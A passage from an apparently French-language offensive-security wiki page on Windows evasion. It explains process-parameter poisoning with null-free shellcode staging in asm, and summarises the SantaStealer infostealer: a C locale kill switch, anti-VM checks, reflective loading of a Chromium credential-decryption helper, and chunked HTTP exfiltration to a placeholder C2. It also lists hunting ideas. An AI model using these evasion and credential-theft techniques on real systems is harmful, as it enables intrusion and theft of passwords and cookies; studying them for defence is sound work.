- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation des octets nuls et staged shellcode

Les trois carriers sont des données de type **string ou assimilées à des strings**, de sorte qu'un payload brut contenant `0x00` est tronqué lors du transfert. Une solution pratique consiste à utiliser un **premier stage sans octets nuls**, qui reconstruit les constantes à l'exécution, puis charge un second stage arbitraire.

Un schéma simple consiste à synthétiser les constantes avec un XOR :
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Cela permet au first stage de construire des chaînes pour la stack, des arguments d’API, des chemins de DLL ou un second-stage shellcode loader sans intégrer d’octets nuls dans le paramètre transporté.

### Appels d’API basés sur la stack depuis le first stage

Lorsque le first stage doit appeler des API telles que `LoadLibraryA`, il peut :

- pousser la chaîne/le buffer sur la stack cible
- réserver le **32-byte x64 shadow space**
- définir `RCX`, `RDX`, `R8`, `R9` sur des constantes ou des pointeurs relatifs à `RSP`
- maintenir `RSP` **aligné sur 16 octets** avant l’appel

Un second stage peut ensuite être copié depuis la stack vers une allocation `PAGE_READWRITE`, passée à `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis exécutée, ce qui évite une allocation RWX directe.

### Idées de détection

Bonnes opportunités de hunting mentionnées par les auteurs :

- `VirtualProtectEx` / `NtProtectVirtualMemory` rendant **exécutables des pages de paramètres de processus**
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- lectures distantes du `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- valeurs `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` inhabituellement longues ou à haute entropie lors de la création d’un processus

### Notes

- P3 est une **astuce de transfert interprocessus**, et non une primitive d’exécution complète à elle seule : le paramètre copié nécessite toujours un changement des permissions d’exécution ainsi qu’une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été pris en compte par les auteurs, mais écarté, car il atteint en interne des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Tradecraft de SantaStealer pour l’évasion fileless et le vol d’identifiants

SantaStealer (également appelé BluelineStealer) illustre la manière dont les info-stealers modernes combinent AV bypass, anti-analysis et credential access dans un même workflow.<sup>[[24]](#references)</sup>

### Filtrage selon la disposition du clavier et délai de sandbox

- Un indicateur de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est trouvée, l’échantillon crée un marqueur `CIS` vide et se termine avant d’exécuter les stealers, ce qui garantit qu’il ne se déclenche jamais dans les locales exclues tout en laissant un artefact exploitable pour le hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique `check_antivm` en couches

- La variante A parcourt la liste des processus, calcule le hash de chaque nom avec une somme de contrôle glissante personnalisée et le compare à des blocklists intégrées pour les debuggers/sandboxes ; elle répète la somme de contrôle sur le nom de l’ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B inspecte les propriétés du système (seuil minimal du nombre de processus, durée de fonctionnement récente), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox et effectue des vérifications de temporisation autour des pauses afin de repérer l’exécution pas à pas. Toute détection interrompt l’exécution avant le lancement des modules.

### Helper fileless + chargement reflectif double ChaCha20

- La DLL/EXE principale intègre un helper Chromium de récupération d’identifiants qui est soit déposé sur le disque, soit mappé manuellement en mémoire ; le mode fileless résout lui-même les imports/relocations afin qu’aucun artefact du helper ne soit écrit.
- Ce helper stocke une DLL de seconde étape chiffrée deux fois avec ChaCha20 (deux clés de 32 octets + des nonces de 12 octets). Après les deux passes, il charge reflectivement le blob (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Les routines ChromElevator utilisent un process hollowing reflectif par direct-syscall pour injecter du code dans un navigateur Chromium actif, récupérer les clés AppBound Encryption et déchiffrer les mots de passe/cookies/cartes bancaires directement depuis les bases de données SQLite malgré le durcissement ABE.


### Collecte modulaire en mémoire et exfiltration HTTP par chunks

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et crée un thread par module activé (Telegram, Discord, Steam, captures d’écran, documents, extensions de navigateur, etc.). Chaque thread écrit ses résultats dans des buffers partagés et signale son nombre de fichiers après une fenêtre d’attente (`join`) d’environ 45 s.
- Une fois terminé, l’ensemble est compressé avec la bibliothèque statiquement liée `miniz` sous `%TEMP%\\Log.zip`. `ThreadPayload1` attend ensuite 15 s et transmet l’archive par chunks de 10 Mo via une requête HTTP POST vers `http://<C2>:6767/upload`, en usurpant une boundary de navigateur `multipart/form-data` (`----WebKitFormBoundary***`). Chaque chunk ajoute `User-Agent: upload`, `auth: <build_id>`, éventuellement `w: <campaign_tag>`, et le dernier chunk ajoute `complete: true` afin que le C2 sache que la réassemblage est terminé.

## References

- [1] [Techniques avancées d’évasion : Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Les call stacks : plus de passe-droit pour les malwares](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemple](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemple](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – usurpation de call stack PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nouvelle chaîne d’infection et obfuscation basée sur ConfuserEx pour le stealer DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Faut-il faire confiance à votre zero trust ? Contourner les vérifications de posture de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Avant ToolShell : exploration des précédentes opérations de ransomware de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading : exploitation des forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventaire des forwarded exports de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordre de recherche des dynamic-link libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sécurité des processus et droits d’accès](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Référence EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Lanceur CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrer les EDR avec le soutien de Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Briser la protection de Windows Defender avec la technique de redirection de dossier](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Référence de la commande mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sous le rideau Pure : du RAT au builder puis au codeur](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arrive en ville : un nouveau stealer ambitieux](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Déchiffrement de Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader : vaincre les malwares Node.js avec l’API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty : mettre Adaptix au repos avec Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Empoisonnement des paramètres de processus](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II : CFG, CET et usurpation de stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation du sommeil Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Masquer votre Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Exploitation de Chrome Remote Desktop dans les opérations Red Team : guide pratique](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged : militariser le driver de remédiation de Defender comme primitive d’opération kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Code compagnon Function Peekaboo de MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo : créer des fonctions auto-masquantes avec LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
